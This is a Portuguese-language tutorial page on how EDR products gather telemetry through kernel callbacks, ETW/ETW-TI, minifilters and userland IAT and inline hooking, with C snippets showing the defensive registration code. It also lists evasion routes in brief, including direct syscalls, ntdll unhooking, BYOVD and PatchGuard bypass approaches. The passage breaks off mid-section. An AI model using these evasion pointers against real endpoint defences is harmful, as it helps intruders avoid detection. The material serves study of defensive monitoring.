---
layout: cyber
section: evasao
title: "EDR — Telemetria, Hooking e Evasão"
---

# EDR — Telemetria, Hooking e Evasão

# O que e?

EDR (Endpoint Detection and Response) e uma categoria de produto de seguranca que coleta e
analisa telemetria do endpoint em tempo real para detectar, investigar e responder a ameacas.
Ao contrario do antivirus tradicional baseado em assinaturas — que compara hashes e padroes
de bytes contra uma base de dados — o EDR analisa comportamento: sequencias de chamadas de
API, arvores de processos, alocacoes de memoria, operacoes de rede e acesso a arquivos.

**Componentes de um EDR moderno:**

```
Sensor no endpoint (duas camadas):
  Kernel driver
    — Registra callbacks de kernel para monitoramento em tempo real
    — PsSetCreateProcessNotifyRoutine (criacao de processos)
    — PsSetLoadImageNotifyRoutine (carregamento de DLLs/imagens)
    — PsSetCreateThreadNotifyRoutine (criacao de threads)
    — ObRegisterCallbacks (operacoes em handles de processos)
    — CmRegisterCallback (operacoes em registry)
    — FltRegisterFilter (minifilter de filesystem)

  Userland agent (DLL injetada em cada processo)
    — Inline hooking de funcoes NT* em ntdll.dll
    — IAT hooking de funcoes Win32 em kernel32.dll, advapi32.dll
    — Intercepta chamadas de API antes de chegarem ao kernel
    — Inspeciona parametros, logs e decide se bloqueia ou permite

Backend analytics:
  — Cloud ou on-prem (depende do produto)
  — Recebe fluxo de telemetria do sensor
  — Correlaciona eventos em multiplos hosts
  — Aplica modelos de ML/AI para deteccao de anomalias
  — Armazena telemetria para threat hunting retroativo

Console de investigacao:
  — Interface web para analistas SOC
  — Timeline de eventos por host
  — Arvore de processos completa
  — Busca por IOC (hash, IP, dominio, comando)
  — Isolation e resposta remota (kill process, quarantine file)
```

**ETW (Event Tracing for Windows) — backbone de telemetria:**

ETW e o framework de logging de alta performance integrado ao kernel do Windows desde Vista.
Nao e uma adicao do EDR — e parte do proprio Windows, disponivel para qualquer software de
monitoramento, debugging e performance analysis.

```
ETW e organizado em tres componentes:
  Providers  — qualquer componente do sistema ou aplicacao que emite eventos
               Cada provider tem um GUID unico e define seus eventos
               Providers de kernel: criados automaticamente pelo Windows
               Providers de userland: registrados por aplicacoes via EventRegister()

  Sessions   — coletores de eventos que se inscrevem em providers
               Ate 64 sessoes ETW simultaneas no sistema
               NT Kernel Logger: sessao especial para eventos de kernel
               Sessoes do EDR: inscrevem-se nos providers mais criticos

  Consumers  — processam os eventos coletados pelas sessoes
               EDR agent e o consumer mais critico
               SilkETW, WPR, ETWExplorer: ferramentas de analise
```

O provider mais critico para seguranca e o `Microsoft-Windows-Threat-Intelligence` (ETW-TI),
com GUID `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`. Este provider e Protected Process Light
(PPL) — apenas processos do EDR rodando como PPL podem se inscrever e receber seus eventos,
o que dificulta significativamente o bypass por parte de atacantes nao-privilegiados.

# Onde e implementado?

EDRs estao presentes em toda organizacao com orcamento de seguranca e postura de seguranca
moderna. O mercado de EDR e um dos mais ativos em ciberseguranca:

```
Produtos EDR/XDR lideres de mercado (2024-2026):
  CrowdStrike Falcon
    — Sensor: CSAgent.sys (kernel driver) + CSSensor.exe (agent)
    — DLL injetada: CrowdStrike DLL (nome varia por versao)
    — Backend: cloud (AWS)
    — Cobertura: Windows, macOS, Linux, containers

  SentinelOne
    — Sensor: sentinelone.sys + SentinelAgent.exe
    — DLL injetada: InProcessClient64.dll / SentinelHelperService.dll
    — Backend: cloud (multi-cloud) ou on-prem (SentinelOne Private)
    — Cobertura: Windows, macOS, Linux, containers, IoT

  Microsoft Defender for Endpoint (MDE)
    — Integrado ao Windows (MsSense.exe, MsMpEng.exe)
    — DLL injetada: MpOav.dll (AMSI provider), sensor integrado
    — Backend: Microsoft cloud (Azure)
    — Vantagem: integracao nativa com AMSI, Credential Guard, WDAC

  Carbon Black (VMware/Broadcom)
    — Sensor: cbdefense.sys + CbDefense.exe
    — DLL: RepMgr.dll
    — Oferece EDR-lite (Cb Response) e full XDR (Cb Enterprise)

  Cortex XDR (Palo Alto Networks)
    — Sensor: cyverak.sys + cytray.exe
    — Integracao com WildFire (sandbox cloud)

  Elastic Security
    — Open source core, enterprise subscription para features avancadas
    — Integra com ELK Stack (Elasticsearch, Logstash, Kibana)

Distribuicao por tipo de endpoint:
  Workstations Windows: dominio principal de todos os EDRs acima
  Servidores Windows: cobertura tipicamente menor (custo por agente)
  Servidores Linux: suporte crescente em todos os produtos
  macOS: cobertura boa em CrowdStrike, SentinelOne, MDE
  Containers: suporte via eBPF em Elastic, suporte limitado em outros
```

**ETW — presente em todo sistema Windows desde Vista:**

ETW nao e exclusivo de EDRs. Qualquer ferramenta de monitoramento, debugging e performance
usa ETW:

```
Ferramentas Microsoft que consomem ETW:
  WPA (Windows Performance Analyzer) — profiling de performance
  PerfMon (Performance Monitor) — metricas de sistema em tempo real
  WPR (Windows Performance Recorder) — captura de traces ETW
  xperf — linha de comando para captura ETW
  WinDbg — debugging com suporte a ETW trace analysis
  Event Viewer — visualizacao de logs (Event Log usa ETW internamente)

Ferramentas de seguranca que consomem ETW:
  SilkETW (FireEye/Mandiant) — framework de consumo ETW para threat hunting
  ETWExplorer — visualizacao de providers e eventos registrados
  Process Monitor (Sysinternals) — usa driver + ETW para monitoramento
  API Monitor — analise de chamadas de API (IAT hooking + ETW)
  Todo EDR moderno (CrowdStrike, SentinelOne, MDE, etc.)
```

# Como funciona de forma adequada?

O EDR opera em multiplas camadas simultaneas. Cada camada e um canal de telemetria independente.
Compreender cada camada e essencial para entender o que e visivel ao defender e o que pode
ser contornado.

```
+------------------------------------------------------------------+
|               CAMADAS DE TELEMETRIA DO EDR                       |
+------------------------------------------------------------------+
|                                                                  |
|  CAMADA 1: KERNEL CALLBACKS (Ring 0)                             |
|  +------------------------------------------------------------+  |
|  | EDR Kernel Driver registra callbacks no Windows Kernel:    |  |
|  |                                                            |  |
|  | PsSetCreateProcessNotifyRoutineEx                          |  |
|  |   -> toda criacao/terminacao de processo                   |  |
|  |   -> visibilidade: path, cmdline, PPID, imagem             |  |
|  |                                                            |  |
|  | PsSetLoadImageNotifyRoutine                                |  |
|  |   -> todo carregamento de DLL ou EXE em qualquer processo  |  |
|  |   -> visibilidade: nome da imagem, base de carga, PID      |  |
|  |                                                            |  |
|  | PsSetCreateThreadNotifyRoutine                             |  |
|  |   -> criacao e terminacao de threads                       |  |
|  |   -> visibilidade: PID, TID, cross-process threads         |  |
|  |                                                            |  |
|  | ObRegisterCallbacks                                        |  |
|  |   -> handles em processos e threads                        |  |
|  |   -> pode MODIFICAR access mask (remover direitos)         |  |
|  |   -> usado para proteger LSASS contra dump                 |  |
|  |                                                            |  |
|  | CmRegisterCallbackEx                                       |  |
|  |   -> operacoes de registry em tempo real                   |  |
|  |   -> visibilidade: criacao, modificacao, exclusao de chaves |  |
|  |                                                            |  |
|  | FltRegisterFilter (minifilter)                             |  |
|  |   -> operacoes de filesystem (Pre/Post I/O)                |  |
|  |   -> visibilidade: criacao, leitura, escrita de arquivos   |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 2: ETW (Event Tracing for Windows)                       |
|  +------------------------------------------------------------+  |
|  | EDR se inscreve em providers criticos de ETW:              |  |
|  |                                                            |  |
|  | Microsoft-Windows-Threat-Intelligence (PPL only)           |  |
|  |   GUID: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}            |  |
|  |   Eventos: VirtualAllocEx remoto, QueueUserAPC,            |  |
|  |            SetThreadContext, ReadProcessMemory em protegido |  |
|  |                                                            |  |
|  | Microsoft-Windows-Kernel-Process                           |  |
|  |   GUID: {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}            |  |
|  |   Eventos: ProcessStart, ProcessStop, ThreadStart          |  |
|  |                                                            |  |
|  | Microsoft-Windows-PowerShell                               |  |
|  |   Eventos: Script Block Logging (Event 4104)               |  |
|  |            Engine Lifecycle, Pipeline Execution            |  |
|  |                                                            |  |
|  | Microsoft-Windows-Security-Auditing                        |  |
|  |   Eventos: 4688 (Process Create), 4656 (Handle Request)    |  |
|  |            4663 (Object Access), 4698 (Scheduled Task)     |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 3: USERLAND API HOOKING (Ring 3)                         |
|  +------------------------------------------------------------+  |
|  | EDR injeta DLL em cada processo via kernel driver          |  |
|  | (usando PsSetLoadImageNotifyRoutine para injetar ao load)  |  |
|  |                                                            |  |
|  | Inline Hooking (principal metodo):                         |  |
|  |   Primeiros bytes de funcoes NT* em ntdll.dll sao          |  |
|  |   substituidos por JMP para codigo do EDR                  |  |
|  |                                                            |  |
|  |   ANTES: 4C 8B D1  mov r10, rcx  (syscall stub legitimo)  |  |
|  |          B8 18 00  mov eax, 0x18 (SSN da funcao)           |  |
|  |                                                            |  |
|  |   DEPOIS: E9 XX XX XX XX  jmp EDR_NtAllocateVirtualMemory  |  |
|  |                                                            |  |
|  | O EDR intercepta ANTES do syscall chegar ao kernel:        |  |
|  |   1. Inspeciona parametros (pid alvo, tamanho, protecao)   |  |
|  |   2. Captura call stack (verifica se origem e legitima)     |  |
|  |   3. Registra evento no backend                            |  |
|  |   4. Decide: permite (executa trampoline) ou bloqueia       |  |
|  |                                                            |  |
|  | IAT Hooking (metodo auxiliar):                             |  |
|  |   Modifica Import Address Table do processo                |  |
|  |   Redireciona funcoes Win32 de kernel32.dll, advapi32.dll  |  |
|  |   Menos robusto que inline (pode ser bypassed via          |  |
|  |   GetProcAddress ou chamada direta de enderecos)           |  |
|  +------------------------------------------------------------+  |
|                                                                  |
|  CAMADA 4: BACKEND ANALYTICS E CORRELACAO                        |
|  +------------------------------------------------------------+  |
|  | Todos os eventos das camadas 1-3 sao enviados ao backend:  |  |
|  |                                                            |  |
|  | Correlacao temporal:                                       |  |
|  |   PowerShell lanca cmd.exe -> cmd.exe lanca net.exe        |  |
|  |   Sequencia de operacoes que individualmente sao normais   |  |
|  |   mas em conjunto indicam ataque                           |  |
|  |                                                            |  |
|  | Behavioral rules:                                          |  |
|  |   "VirtualAllocEx RWX + WriteProcessMemory + CreateRemote  |  |
|  |    Thread no mesmo proceso em menos de 1 segundo"          |  |
|  |   = signature comportamental de process injection          |  |
|  |                                                            |  |
|  | ML/AI scoring:                                             |  |
|  |   Score de ameaca baseado em desvio do baseline do host    |  |
|  |   Deteccao de anomalias: comportamento fora do padrao      |  |
|  +------------------------------------------------------------+  |
+------------------------------------------------------------------+
```

**Diferenca fundamental: EDR em userland e mais evasivel que EDR em kernel:**

```
Hooks de userland (inline hooking em ntdll.dll):
  + Visibilidade rica de parametros de API
  + Pode inspecionar contexto completo da chamada
  - Reside no mesmo espaco de enderecamento do atacante
  - Pode ser bypassed via syscalls diretas (Direct Syscalls)
  - Pode ser removido via unhooking (copiar ntdll limpa do disco)
  - Detectavel verificando primeiros bytes das funcoes NT*

Callbacks de kernel (PsSetCreateProcessNotifyRoutine, etc.):
  + Nao removivel por userland (PatchGuard protege o kernel)
  + Visibilidade de eventos de nivel de sistema
  - Parametros mais limitados que hooks de userland
  - ETW-TI requer PPL para assinar (dificil de atacar sem kernel driver)
  - A classe de bypass via driver vulneravel (BYOVD) ataca esta camada
```

**Por que o Microsoft-Windows-Threat-Intelligence e o provider mais critico:**

```
ETW-TI gera eventos diretamente do kernel para operacoes especificas de injecao:

Evento  1: KERNEL_THREATINT_TASK_ALLOCVMSUSPENDED
           VirtualAlloc com MEM_WRITE_WATCH em processo remoto

Evento  5: KERNEL_THREATINT_TASK_QUEUEUSERAPC
           QueueUserAPC para thread de processo remoto

Evento  6: KERNEL_THREATINT_TASK_SETTHREADCONTEXT
           SetThreadContext em thread de processo remoto

Evento  8: KERNEL_THREATINT_TASK_READREMOTEPROCESS
           ReadProcessMemory em processo remoto (LSASS dump)

Evento 10: KERNEL_THREATINT_TASK_ALLOCVM_REMOTE
           VirtualAllocEx com permissoes RWX em processo remoto

Evento 12: KERNEL_THREATINT_TASK_MAPVIEWOFVIRTUALSECTION_REMOTE
           MapViewOfSection em processo remoto (section-based injection)

Como e protegido:
  O consumer (EDR agent) precisa ser um Protected Process Light (PPL)
  Processos PPL rodam com RunAsPPL = 1 no registro ou via politica
  Atacantes nao podem se inscrever no ETW-TI sem PPL
  Terminar o processo PPL do EDR requer driver de kernel assinado
```

---

## A Arquitetura Interna do EDR

### Visão Arquitetural Geral

```
┌─────────────────────────────────────────────────────────┐
│                    USERLAND (Ring 3)                     │
│  ┌─────────────┐    ┌──────────────┐   ┌─────────────┐ │
│  │  Processo   │    │  ntdll.dll   │   │  EDR DLL    │ │
│  │  (malware)  │───>│  (hooked)    │──>│  (injected) │ │
│  └─────────────┘    └──────────────┘   └─────────────┘ │
│         │                                      │         │
│         │ ETW Provider                         │ ETW     │
│         ▼                                      ▼         │
│  [ETW Session] ←──────────────────────[EDR Consumer]   │
├─────────────────────────────────────────────────────────┤
│                   KERNEL (Ring 0)                        │
│  ┌──────────────────────────────────────────────────┐   │
│  │              EDR Kernel Driver                    │   │
│  │  ┌─────────────────┐  ┌────────────────────────┐ │   │
│  │  │ Kernel Callbacks│  │  Minifilter Driver     │ │   │
│  │  │ • ProcessNotify │  │  • Pre/PostCreate      │ │   │
│  │  │ • LoadImage     │  │  • Pre/PostRead        │ │   │
│  │  │ • ThreadNotify  │  │  • Pre/PostWrite       │ │   │
│  │  │ • ObRegister    │  │                        │ │   │
│  │  │ • CmRegister    │  └────────────────────────┘ │   │
│  │  └─────────────────┘                             │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

---

## Na Prática — PARTE 1: Telemetria de Kernel

### Kernel Callbacks — O Mecanismo Primário

O Windows Kernel expõe APIs para drivers registrarem callbacks que são invocados quando eventos específicos ocorrem. EDR drivers registram esses callbacks para monitoramento em tempo real.

#### PsSetCreateProcessNotifyRoutine — Criação de Processos

Chamado sempre que um processo é criado ou terminado. É o callback mais fundamental — todo EDR o usa.

```c
// Assinatura da routine que o EDR registra
VOID ProcessNotifyCallback(
    PEPROCESS Process,          // Object do processo
    HANDLE ProcessId,           // PID
    PPS_CREATE_NOTIFY_INFO CreateInfo  // NULL se terminando
);

// CreateInfo contém:
// - ImageFileName: caminho do executável
// - CommandLine: linha de comando completa
// - ParentProcessId: PID do processo pai
// - CreatingThreadId: TID que criou o processo
// - FileObject: file object do executável
// - IsSubsystemProcess: se é subsistema (WSL, etc.)

// O EDR registra assim:
PsSetCreateProcessNotifyRoutineEx(
    (PCREATE_PROCESS_NOTIFY_ROUTINE_EX)ProcessNotifyCallback,
    FALSE  // FALSE = registrar, TRUE = remover
);
```

**O que o EDR detecta via este callback**:
- Parent process spoofing (PPID mismatch)
- Binários executados de paths suspeitos (Temp, AppData)
- Processos filhos inesperados (Word.exe → cmd.exe → powershell.exe)
- Command lines suspeitas (codificadas em base64, com `-enc`, `-w hidden`)

#### PsSetLoadImageNotifyRoutine — Carregamento de DLLs/PEs

Chamado quando qualquer imagem PE (DLL ou EXE) é mapeada no espaço de endereço de um processo. Crítico para detecção de process injection.

```c
// Assinatura
VOID LoadImageCallback(
    PUNICODE_STRING FullImageName,  // Caminho completo da imagem
    HANDLE ProcessId,               // PID onde está sendo carregada
    PIMAGE_INFO ImageInfo           // Informações da imagem
);

// ImageInfo contém:
// - ImageBase: endereço base na memória
// - ImageSize: tamanho
// - SystemModeImage: se é kernel mode
// - ImageMappedToAllPids: se mapeada em todos os processos
// - LoadOrderIndex: índice na lista de módulos
```

**O que o EDR detecta**:
- DLLs carregadas de paths incomuns
- DLLs sem correspondência no disco (reflective injection)
- Módulos com nomes que imitam DLLs legítimas (typosquatting)
- Sequência suspeita de carregamento (dll injection indica por VirtualAllocEx + WriteProcessMemory + CreateRemoteThread → depois LoadImage de DLL injetada)

#### PsSetCreateThreadNotifyRoutine — Criação de Threads

```c
VOID ThreadNotifyCallback(
    HANDLE ProcessId,   // PID do processo
    HANDLE ThreadId,    // TID da nova thread
    BOOLEAN Create      // TRUE = criando, FALSE = terminando
);
```

**O que o EDR detecta**:
- Threads criadas via `CreateRemoteThread` (cross-process)
- Threads com endereço inicial em região de memória anônima (não mapeada a arquivo)
- Thread injection via `NtCreateThreadEx` com flags suspeitas
- APC injection (via `QueueUserAPC`)

#### ObRegisterCallbacks — Operações em Object Handles

Este callback é poderoso e frequentemente subutilizado pela literatura. Permite ao EDR interceptar e até BLOQUEAR operações de handle em processos e threads.

```c
// Estrutura de registro
OB_CALLBACK_REGISTRATION CallbackReg = {0};
OB_OPERATION_REGISTRATION OpReg[2] = {0};

// Registrar callback para handles de processo
OpReg[0].ObjectType = PsProcessType;
OpReg[0].Operations = OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE;
OpReg[0].PreOperation = PreOperationCallback;
OpReg[0].PostOperation = PostOperationCallback;

// Registrar callback para handles de thread
OpReg[1].ObjectType = PsThreadType;
OpReg[1].Operations = OB_OPERATION_HANDLE_CREATE;
OpReg[1].PreOperation = PreOperationCallback;
OpReg[1].PostOperation = NULL;

CallbackReg.Version = OB_FLT_REGISTRATION_VERSION;
CallbackReg.OperationRegistrationCount = 2;
CallbackReg.Altitude = RTL_CONSTANT_STRING(L"321000");
CallbackReg.RegistrationContext = NULL;
CallbackReg.OperationRegistration = OpReg;

ObRegisterCallbacks(&CallbackReg, &RegistrationHandle);
```

**Pre-operation callback pode MODIFICAR o access mask solicitado**:

```c
OB_PREOP_CALLBACK_STATUS PreOperationCallback(
    PVOID RegistrationContext,
    POB_PRE_OPERATION_INFORMATION OperationInformation)
{
    // EDR pode remover direitos de acesso perigosos
    // Isso é como alguns EDRs protegem seus próprios processos
    if (OperationInformation->ObjectType == *PsProcessType)
    {
        // Remover PROCESS_VM_READ/WRITE para processos protegidos
        OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &=
            ~(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION);
    }
    return OB_PREOP_SUCCESS;
}
```

**O que o EDR detecta/bloqueia via ObRegister**:
- Tentativas de abrir handles com `PROCESS_VM_READ` em processos protegidos (LSASS)
- Tentativas de `PROCESS_ALL_ACCESS` em processos críticos
- Cross-process handle operations

#### CmRegisterCallback — Registry

```c
// Monitora operações de registry em tempo real
CmRegisterCallbackEx(
    RegistryCallback,
    &Altitude,
    DriverObject,
    NULL,
    &CallbackCookie,
    NULL
);

// Callback recebe:
// - RegNtPreSetValueKey: antes de setar um valor
// - RegNtPreCreateKey: antes de criar uma chave
// - RegNtPreDeleteKey: antes de deletar
// - RegNtPreOpenKey: antes de abrir
```

**Detecta**:
- Modificação de Run keys (persistence)
- Modificação de chaves de serviços
- Criação de chaves COM em HKCU (COM hijacking)
- Modificação de Image File Execution Options

### Minifilter Driver — File System

Um minifilter driver recebe Pre e Post callbacks para cada operação de I/O:

```
IRP_MJ_CREATE    → Pre/Post create (abrir/criar arquivo)
IRP_MJ_READ      → Pre/Post read
IRP_MJ_WRITE     → Pre/Post write
IRP_MJ_CLEANUP   → Arquivo fechado
IRP_MJ_SET_INFORMATION → Renomear/deletar arquivo
```

```c
// Registro de minifilter
FLT_OPERATION_REGISTRATION Callbacks[] = {
    { IRP_MJ_CREATE, 0, PreCreate, PostCreate },
    { IRP_MJ_WRITE, 0, PreWrite, NULL },
    { IRP_MJ_SET_INFORMATION, 0, PreSetInfo, NULL },
    { IRP_MJ_OPERATION_END }
};

FLT_FILTER_REGISTRATION FilterReg = {
    sizeof(FLT_FILTER_REGISTRATION),
    FLT_REGISTRATION_VERSION,
    0,
    NULL,
    Callbacks,
    DriverUnload,
    NULL, NULL, NULL, NULL, NULL, NULL
};

FltRegisterFilter(DriverObject, &FilterReg, &Filter);
FltStartFiltering(Filter);
```

**Detecta**:
- Escrita de executáveis em disco (dropper behavior)
- Renomeação de arquivos (ransomware indicator)
- Acesso a arquivos sensíveis (SAM, NTDS.dit, shadow copies)
- Criação de arquivos em locais suspeitos

---

### PatchGuard (KPP — Kernel Patch Protection)

PatchGuard impede que **qualquer código** — incluindo drivers assinados — modifique estruturas críticas do kernel. É a razão pela qual EDRs **não hookam o kernel** diretamente mas usam os mecanismos de callback oficiais.

**O que PatchGuard protege:**

| Estrutura | Por quê é crítica |
|-----------|-------------------|
| SSDT (System Service Descriptor Table) | Tabela de syscalls — modificar redireciona chamadas de sistema |
| IDT (Interrupt Descriptor Table) | Handlers de interrupção/exceção |
| GDT (Global Descriptor Table) | Segmentos de memória |
| MSR LSTAR | Endereço do syscall handler (`KiSystemCall64`) |
| Código de funções kernel críticas | `NtCreateProcess`, `MmAllocateVirtualMemory`, etc. |
| KPCR (Kernel Processor Control Region) | Estrutura de controle por CPU |

**Mecanismo:**
```
- Verificações ocorrem aleatoriamente a cada 5–10 minutos
- PatchGuard ofusca seu próprio código (anti-reversão) para dificultar bypass
- Roda via: timer DPC ou thread de sistema
- Detecção → BSOD imediato: bug check 0x109 CRITICAL_STRUCTURE_CORRUPTION
```

**Bypass — Técnicas Históricas:**

| Técnica | Status | Detalhe |
|---------|--------|---------|
| BYOVD (Bring Your Own Vulnerable Driver) | **Mais viável** | Driver assinado vulnerável → escrita kernel arbitrária antes da verificação; não modifica estruturas protegidas diretamente |
| Race condition | Arriscado | Modificar SSDT → fazer syscall → restaurar antes da verificação de PG |
| Infinity Hook | Patchado pela MS | Hookava rotina de despacho de DPC usada por PatchGuard |
| Hipervisor | Complexo | Interceptar hypercalls; manipular estado de hardware antes da verificação |

**Impacto prático:** o SSDT hooking (técnica clássica de AV dos anos 2000) está morto no Windows 64-bit. EDRs modernos usam callbacks oficiais (`PsSetCreateProcessNotifyRoutine`, etc.) exatamente para não precisar modificar o que PatchGuard protege.

---

## Na Prática — PARTE 2: ETW (Event Tracing for Windows)

### Arquitetura ETW Completa

ETW é um sistema de logging de alta performance integrado ao Windows kernel. A arquitetura tem três componentes:

```
┌─────────────────────────────────────────────────────────┐
│                    ETW ARCHITECTURE                      │
│                                                          │
│  PROVIDERS (quem gera eventos)                          │
│  ┌────────────┐ ┌────────────┐ ┌─────────────────────┐  │
│  │  Kernel    │ │  User-mode │ │   ETW-TI (PPL only) │  │
│  │  Providers │ │  Providers │ │ Microsoft-Windows-  │  │
│  │  (built-in)│ │  (apps)    │ │ Threat-Intelligence │  │
│  └────────────┘ └────────────┘ └─────────────────────┘  │
│         │               │                │               │
│         └───────────────┴────────────────┘               │
│                         │                                │
│                   ┌─────▼──────┐                        │
│                   │  ETW Core  │  (Kernel)              │
│                   │  (Buffers) │                        │
│                   └─────┬──────┘                        │
│                         │                               │
│  SESSIONS (quem coleta) │                               │
│  ┌──────────────────────▼─────────────────────────────┐ │
│  │  NT Kernel Logger  │  AutoLogger  │  EDR Session   │ │
│  └──────────────────────┬─────────────────────────────┘ │
│                         │                               │
│  CONSUMERS (quem processa)                              │
│  ┌──────────────────────▼──────────────────────────────┐│
│  │  EDR Agent  │  SilkETW  │  WPR  │  Custom Consumer ││
│  └─────────────────────────────────────────────────────┘│
└─────────────────────────────────────────────────────────┘
```

### Como um Provider Registra Eventos

```c
// Provider GUID (cada provider tem GUID único)
// Exemplo: Microsoft-Windows-Kernel-Process
// GUID: {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}

// Registro em userland
EventRegister(
    &ProviderGuid,     // GUID do provider
    NULL,              // Callback (opcional)
    NULL,              // Context
    &ProviderHandle    // Handle resultante
);

// Escrever evento
EventWrite(
    ProviderHandle,
    &EventDescriptor,
    UserDataCount,
    UserData
);

// Desregistrar
EventUnregister(ProviderHandle);
```

### Como uma Session Coleta Eventos

```c
// Iniciar sessão ETW via API (simplificado)
// Na prática, usa-se StartTrace + EnableTraceEx2

EVENT_TRACE_PROPERTIES Properties = {0};
Properties.Wnode.BufferSize = sizeof(EVENT_TRACE_PROPERTIES) + sizeof(SessionName);
Properties.Wnode.Flags = WNODE_FLAG_TRACED_GUID;
Properties.Wnode.ClientContext = 1;  // QueryPerformanceCounter
Properties.Wnode.Guid = SessionGuid;
Properties.LogFileMode = EVENT_TRACE_REAL_TIME_MODE;
Properties.FlushTimer = 1;

TRACEHANDLE SessionHandle;
StartTrace(&SessionHandle, SessionName, &Properties);

// Habilitar provider específico na session
ENABLE_TRACE_PARAMETERS EnableParameters = {0};
EnableParameters.Version = ENABLE_TRACE_PARAMETERS_VERSION_2;

EnableTraceEx2(
    SessionHandle,
    &ProviderGuid,      // GUID do provider a habilitar
    EVENT_CONTROL_CODE_ENABLE_PROVIDER,
    TRACE_LEVEL_VERBOSE,
    0xFFFFFFFFFFFFFFFF, // MatchAnyKeyword (todos os eventos)
    0,
    INFINITE,
    &EnableParameters
);
```

### ETW-TI — Microsoft-Windows-Threat-Intelligence

Este é o provider mais crítico para segurança. Diferente de outros providers ETW, o ETW-TI requer que o consumer seja um **Protected Process Light (PPL)** para receber eventos. Isso significa que apenas processos do EDR rodando como PPL podem assinar este provider.

**GUID**: `{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}`

**Eventos críticos gerados pelo ETW-TI**:

| Event ID | Nome | Técnica ATT&CK |
|---|---|---|
| 1 | KERNEL_THREATINT_TASK_ALLOCVMSUSPENDED | Process Injection |
| 2 | KERNEL_THREATINT_TASK_PROTECTVM_KERNEL | Driver Loading |
| 5 | KERNEL_THREATINT_TASK_QUEUEUSERAPC | APC Injection |
| 6 | KERNEL_THREATINT_TASK_SETTHREADCONTEXT | Thread Hijacking |
| 8 | KERNEL_THREATINT_TASK_READREMOTEPROCESS | Credential Dumping |
| 10 | KERNEL_THREATINT_TASK_ALLOCVM_REMOTE | Remote VirtualAlloc |
| 12 | KERNEL_THREATINT_TASK_MAPVIEWOFVIRTUALSECTION_REMOTE | Mapping Injection |

### Mapeamento ETW por Técnica ATT&CK

#### Process Injection (T1055)

```
Providers relevantes:
  - Microsoft-Windows-Kernel-Process (GUID: 22FB2CD6-...)
    • Evento: ProcessStart, ThreadStart
  - ETW-TI
    • Evento 1: VirtualAllocEx em processo remoto (RWX)
    • Evento 5: QueueUserAPC
    • Evento 6: SetThreadContext
    • Evento 10: VirtualAlloc remote
  - Microsoft-Windows-DotNETRuntime (para .NET injection)

Eventos Sysmon correspondentes: 8 (CreateRemoteThread), 10 (ProcessAccess)
```

#### Credential Dumping (T1003)

```
Providers relevantes:
  - ETW-TI Evento 8: ReadProcessMemory no processo LSASS
  - Microsoft-Windows-Security-Auditing
    • Event 4688 (process creation de tools conhecidas)
    • Event 4656 (handle request para LSASS)
    • Event 4663 (acesso a objeto — SAM hive)
  - Microsoft-Windows-LSA

Registry keys auditadas:
  HKLM\SAM
  HKLM\SECURITY
  HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
```

#### Lateral Movement (T1021)

```
Providers relevantes:
  - Microsoft-Windows-SMBClient/Operational
    • Conexões SMB saindo do host
  - Microsoft-Windows-TerminalServices-LocalSessionManager
    • Logons RDP
  - Microsoft-Windows-WMI-Activity/Operational
    • WMI queries remotas (WMIExec)
  - Microsoft-Windows-PowerShell/Operational
    • PSRemoting (Event 4103, 4104)
```

---

## Na Prática — PARTE 3: Userland API Hooking

### IAT Hooking — Import Address Table

A Import Address Table é uma tabela em cada PE que contém os endereços reais das funções importadas. Quando um processo carrega uma DLL, o loader do Windows resolve os endereços e os escreve na IAT.

**Estrutura da IAT em um PE**:

```
PE Header
  └── Optional Header
        └── Data Directory[1] → Import Directory Table
              └── IMAGE_IMPORT_DESCRIPTOR[]
                    ├── Name: "kernel32.dll"
                    ├── FirstThunk → IAT (endereços resolvidos)
                    └── OriginalFirstThunk → Thunk data original
```

**Como o EDR faz IAT hooking**:

```c
// O EDR injeta sua DLL no processo (via kernel callback + APC)
// Depois modifica a IAT para apontar para suas funções de wrapper

// 1. Encontrar IAT do processo-alvo
PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)moduleBase;
PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(moduleBase + pDosHeader->e_lfanew);
PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(
    moduleBase + pNtHeaders->OptionalHeader.DataDirectory[
        IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);

// 2. Iterar pelos módulos importados
while (pImportDesc->Name) {
    char* dllName = (char*)(moduleBase + pImportDesc->Name);
    PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(
        moduleBase + pImportDesc->FirstThunk);
    
    while (pThunk->u1.Function) {
        // 3. Se encontrou VirtualAllocEx, substituir por wrapper do EDR
        if (pThunk->u1.Function == (ULONGLONG)VirtualAllocEx) {
            // Tornar página writable
            DWORD oldProtect;
            VirtualProtect(&pThunk->u1.Function, sizeof(ULONGLONG), 
                          PAGE_READWRITE, &oldProtect);
            
            // Substituir pelo hook do EDR
            pThunk->u1.Function = (ULONGLONG)EDR_VirtualAllocEx_Hook;
            
            // Restaurar proteção
            VirtualProtect(&pThunk->u1.Function, sizeof(ULONGLONG),
                          oldProtect, &oldProtect);
        }
        pThunk++;
    }
    pImportDesc++;
}
```

**Limitação do IAT hooking**: só afeta chamadas que passam pela IAT. Chamadas via `GetProcAddress` em runtime, ou chamadas diretas a endereços resolvidos manualmente, não são afetadas.

### Inline Hooking — O Método Principal

Inline hooking modifica diretamente os bytes iniciais da função na memória da DLL. É mais robusto que IAT hooking pois intercepta chamadas independentemente de como a função foi encontrada.

**Estrutura típica de um hook de 5 bytes (x86) ou 14 bytes (x64)**:

```
ANTES do hook (NtAllocateVirtualMemory em ntdll.dll):
  [4C 8B D1]    mov r10, rcx        ← instrução original
  [B8 18 00 00] mov eax, 0x18       ← SSN (syscall number)
  [0F 05]       syscall
  [C3]          ret

DEPOIS do hook (EDR instalou hook de 5 bytes JMP):
